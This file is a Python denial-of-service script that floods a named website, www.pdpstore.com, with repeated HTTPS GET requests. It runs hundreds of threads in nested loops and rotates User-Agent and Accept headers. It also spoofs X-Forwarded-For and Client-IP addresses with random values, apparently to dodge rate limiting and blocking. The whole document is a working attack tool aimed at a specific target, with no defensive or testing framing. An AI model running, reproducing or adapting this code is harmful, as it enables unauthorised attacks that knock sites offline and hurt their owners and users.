import socket
import ssl
import json
import random
import threading

def make_ssl_request(host, port):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.create_default_context()

    
    user_agents = ["User-Agent: " + ua for ua in json.load(open("user_agents.json", "r"))["agents"]]
    
    acceptall = [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept-Encoding: gzip, deflate\r\n',
    'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
    'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
    'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
    'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
    'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
    'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
    'Accept: text/html, application/xhtml+xml',
    'Accept-Language: en-US,en;q=0.5\r\n',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
    'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n'
    ]
    
    referer_list = ["Referer: " + ref for ref in json.load(open("referer_list.json", "r"))["referers"]]

    connection = "Connection: Keep-Alive\r\n"

    try:
        ssl_sock = context.wrap_socket(sock, server_hostname=host)
        ssl_sock.connect((host, port))

        while True:
            useragent = random.choice(user_agents) + "\r\n"
            accept = random.choice(acceptall) + "\r\n"
            randomip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
            forward = f"X-Forwarded-For: {randomip}\r\n"
            forward += f"Client-IP: {randomip}\r\n"
            referer = random.choice(referer_list) + "https://www.pdpstore.com\r\n"

            get_host = f"GET / HTTP/1.1\r\nHost: www.pdpstore.com:443\r\n"
            request = get_host + useragent + accept + forward + connection

            # Send HTTP GET request
            
            for _ in range(10000):
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                
                print('Sent with SSL 1.2 [1]')
                
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                ssl_sock.sendall(request.encode())
                
                print('Sent with SSL 1.2 [2]')
            
    except Exception as e:
        print(f'{e}')
        ssl_sock.close()

def make_ssl_requests_in_thread(host, port, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=make_ssl_request, args=(host, port))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    num_threads = 500
    for i in range(num_threads):
        make_ssl_requests_in_thread('www.pdpstore.com', 443, num_threads)
        